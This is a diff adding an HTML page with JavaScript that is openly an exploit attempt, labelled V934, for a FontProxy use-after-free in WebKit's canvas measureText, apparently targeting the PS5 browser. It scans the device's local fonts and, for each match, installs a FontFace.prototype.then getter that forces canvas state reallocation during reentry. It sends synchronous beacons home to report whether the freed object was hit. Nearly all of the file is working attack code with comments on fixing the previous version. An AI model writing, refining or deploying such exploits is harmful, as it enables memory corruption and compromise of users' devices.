@@ -1,0 +1,137 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>V934</title></head>
+<body><pre id="out">V934 - FontProxy UAF (673f4df5) retry: v933 forgot document.fonts.add(face); stage 1 scans which local() names resolve to real system fonts on PS5, stage 2 runs the trigger only against matches</pre>
+<script>
+'use strict';
+var O=document.getElementById('out');
+function say(s){O.textContent+='\n'+s;}
+function bk(t,d){
+  try{var x=new XMLHttpRequest();x.open('GET','/beacon/V934-'+t+'?d='+encodeURIComponent(String(d===undefined?'':d).slice(0,700))+'&t='+Date.now(),false);x.send(null);}catch(e){}
+  O.textContent+='\n'+t+' '+(d===undefined?'':d);
+}
+
+/*
+ * v934 - fixes two v933 defects:
+ *   (1) faces were never added to document.fonts -> CSSFontSelector never
+ *       saw them -> fallback font used (w=6 everywhere) -> no load, no
+ *       resolve(face), no thenable check. The verbatim WebKit test adds.
+ *   (2) even with add(), the trigger only engages if the local() source
+ *       MATCHES a system font: a missing local() name REJECTS the loaded
+ *       promise (no thenable check on the face). PS5 system font names
+ *       were never inventoried -> stage 1 does it now.
+ *
+ * STAGE 1 - local font scan, width oracle:
+ *   ctx.font = '10px "<name>"'; measureText('a').width. Any name that
+ *   resolves a REAL font gives a width different from the no-font fallback
+ *   baseline (measured with a nonsense name). One beacon line carries all
+ *   widths; names within 0.01 of baseline are treated as fallbacks.
+ *
+ * STAGE 2 - trigger per matched name (max 6, ordered most-likely first):
+ *   face = FontFace('VPF<i>', 'local("<name>")'); face.loaded;
+ *   document.fonts.add(face);            <- the v933 fix
+ *   fresh canvas ctx; ctx.save(); ctx.lineWidth=0.5;   (heap-first, verbatim)
+ *   ctx.font='10px VPF<i>'; getter installed on FontFace.prototype.then;
+ *   measureText('a')  -> if the load fulfills synchronously inside
+ *   metricsOfPrimaryFont, resolve(face) does the thenable check, the getter
+ *   runs 18 saves, the state stack reallocs, and the raw FontProxy* that
+ *   measureText holds dies. Beacon order diagnoses:
+ *     F,G then no E  -> died inside measureText after reentry = UAF hit
+ *     F,G,E(H)       -> survived: patched (ref-counted) or coherent memory
+ *     E with status=loaded but no F -> fulfilled asynchronously: no window
+ *
+ * One load. Single-shot, single-page per WebProcess-restart law.
+ */
+
+var CANDIDATES=['SST','SST Light','SST Medium','SST Roman','SST-Bold','Arial',
+  'Helvetica','Times New Roman','Courier New','Georgia','Verdana','Meiryo',
+  'MS Gothic','Yu Gothic','Malgun Gothic','Hiragino Sans','SimSun','Segoe UI',
+  'Roboto','Droid Sans','Open Sans','Noto Sans','Sony Sketch','SF Pro Text',
+  'DIN Alternate','Futura'];
+
+function mwidth(name){
+  try{
+    var c=document.createElement('canvas').getContext('2d');
+    c.font='10px "'+name+'"';
+    return c.measureText('a').width;
+  }catch(e){ return -1; }
+}
+
+/* STAGE 1 */
+var base=mwidth('ZZNoSuchFontZZ');
+var widths={};
+for(var i=0;i<CANDIDATES.length;i++){ widths[CANDIDATES[i]]=mwidth(CANDIDATES[i]); }
+var gen={serif:mwidth('serif'),'sans-serif':mwidth('sans-serif'),monospace:mwidth('monospace')};
+bk('SCAN1','baseline='+base+' '+JSON.stringify(widths));
+bk('SCAN1g','generics='+JSON.stringify(gen));
+
+var matched=[];
+for(var i=0;i<CANDIDATES.length;i++){
+  var n=CANDIDATES[i];
+  if(widths[n]>=0 && Math.abs(widths[n]-base)>0.01){ matched.push({name:n,w:widths[n]}); }
+}
+/* generics that beat the baseline are real fonts too - park them last */
+for(var g in gen){ if(gen[g]>=0 && Math.abs(gen[g]-base)>0.01){ matched.push({name:g,w:gen[g],generic:true}); } }
+bk('MATCHED','n='+matched.length+' '+JSON.stringify(matched.slice(0,8)));
+
+/* STAGE 2 */
+var fired=false, firedTag=null;
+function trigger(idx,name,heapFirst){
+  var tag='T'+idx+(heapFirst?'h':'n');
+  var fam='VPF'+idx;
+  var src='local(\''+name+'\')';
+  var face=null;
+  try{ face=new FontFace(fam,src); }catch(e){ bk(tag+'-face-err',String(e)); return; }
+  try{ face.loaded; }catch(e){}
+  try{ document.fonts.add(face); }catch(e){ bk(tag+'-add-err',String(e)); return; }
+  bk(tag+'-A','face added fam='+fam+' src='+src+' status='+face.status);
+
+  var ctx=null;
+  try{ ctx=document.createElement('canvas').getContext('2d'); }catch(e){ bk(tag+'-ctx-err',String(e)); return; }
+  try{
+    if(heapFirst){ ctx.save(); ctx.lineWidth=0.5; }
+    ctx.font='10px '+fam;
+  }catch(e){ bk(tag+'-font-err',String(e)); return; }
+  bk(tag+'-B','font set (heapFirst='+heapFirst+')');
+
+  var getterFired=0;
+  try{
+    Object.defineProperty(FontFace.prototype,'then',{
+      configurable:true,
+      get:function(){
+        if(getterFired) return undefined;
+        getterFired=1;
+        bk(tag+'-F','GETTER FIRED inside measureText; running 18 saves');
+        for(var j=0;j<18;j++){ try{ ctx.save(); ctx.lineWidth=1+j; }catch(e){ bk(tag+'-save-err',j+' '+String(e)); break; } }
+        bk(tag+'-G','getter done');
+        return undefined;
+      }
+    });
+  }catch(e){ bk(tag+'-def-err',String(e)); return; }
+  bk(tag+'-C','getter installed');
+
+  var w=null;
+  try{ w=ctx.measureText('a'); }catch(e){ bk(tag+'-D-throw',String(e)); }
+  bk(tag+'-D','measureText returned '+(w?('(w='+w.width+')'):'null')+' getterFired='+getterFired+' status='+face.status);
+
+  if(getterFired){
+    fired=true; firedTag=tag;
+    try{ var w2=ctx.measureText('bb'); bk(tag+'-H','2nd measureText OK w='+w2.width); }
+    catch(e){ bk(tag+'-H-throw',String(e)); }
+    try{ bk(tag+'-I','font readback = '+ctx.font); }catch(e){ bk(tag+'-I-throw',String(e)); }
+  }
+  try{ delete FontFace.prototype.then; }catch(e){}
+  bk(tag+'-J','variant done');
+}
+
+var lim=Math.min(matched.length,6);
+for(var i=0;i<lim && !fired;i++){ trigger(i,matched[i].name,true); }
+
+/* null-deref shape for the first match, if the heap-first sweep never fired */
+if(!fired && matched.length>0){
+  trigger('ND',matched[0].name,false);
+}
+
+bk('DONE','sweep complete fired='+fired+' tag='+firedTag+' matched='+matched.length);
+</script></body></html>
